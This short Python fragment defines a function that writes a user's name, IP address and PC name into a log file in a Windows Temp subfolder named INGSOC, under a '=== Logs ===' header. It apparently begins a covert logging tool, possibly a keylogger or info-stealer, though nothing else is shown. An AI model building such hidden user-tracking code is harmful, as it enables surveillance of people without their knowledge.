def data(Username, Ip, PcName):
    userinfo = ('User: ', Username, '\n', 'Ip: ', Ip, '\n', 'PcName: ', PcName, '\n\n\t=== Logs ===\n\n')
    with open('C:/Windows/Temp/INGSOC/log.txt', 'w+') as file:
        file.writelines(userinfo)
        file.close()
